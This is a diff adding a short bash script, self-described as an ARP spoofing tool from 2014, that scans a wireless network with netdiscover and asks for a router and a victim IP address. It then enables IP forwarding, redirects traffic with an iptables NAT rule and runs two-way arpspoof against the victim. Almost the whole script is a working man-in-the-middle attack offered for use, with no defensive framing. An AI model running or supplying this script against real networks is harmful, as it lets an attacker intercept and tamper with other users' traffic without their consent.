@@ -1,0 +1,38 @@
+#!/bin/bash
+clear
+gnome-terminal --working-directory=/root/Desktop -x bash -c "netdiscover -i wlan0"
+echo "             ███████████████████████████             "
+echo "             ███████▀▀▀░░░░░░░▀▀▀███████             "
+echo "             ████▀░░░░░░░░░░░░░░░░░▀████             "
+echo "             ███│░░░░░░░░░░░░░░░░░░░│███             "
+echo "             ██▌│░░░░░░░░░░░░░░░░░░░│▐██             "
+echo "             ██░└┐░░░░░░░░░░░░░░░░░┌┘░██             "
+echo "             ██░░└┐░░░░░░░░░░░░░░░┌┘░░██             "
+echo "             ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██             "
+echo "             ██▌░│██████▌░░░▐██████│░▐██             "
+echo "             ███░│▐███▀▀░░▄░░▀▀███▌│░███             "
+echo "             ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██             "
+echo "             ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██             "
+echo "             ████▄─┘██▌░░░░░░░▐██└─▄████             "
+echo "             █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████             "
+echo "             ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████             "
+echo "             █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████             "
+echo "             ███████▄░░░░░░░░░░░▄███████             "
+echo "             ██████████▄▄▄▄▄▄▄██████████             "
+echo "====================================================="
+echo "       Welcome to the ARP Spoofing Motherfucker      "
+echo "                By Grazer 2014 GPL C.                "
+echo "====================================================="
+arp -a
+echo "====================================================="
+echo -n "Please enter router/AP IP adress: "
+read router
+sleep 2
+echo -n "Please enter victim IP adress: "
+read victim
+sleep 2
+iptables -t nat -A PREROUTING -p tcp --destination-port 90 -j REDIRECT --to-port 8080
+echo '1' > /proc/sys/net/ipv4/ip_forward
+sleep 2
+gnome-terminal --working-directory=/root/Desktop -x bash -c "arpspoof -i wlan0 -t $router $victim ;bash"
+gnome-terminal --working-directory=/root/Desktop -x bash -c "arpspoof -i wlan0 -t $victim $router ;bash"
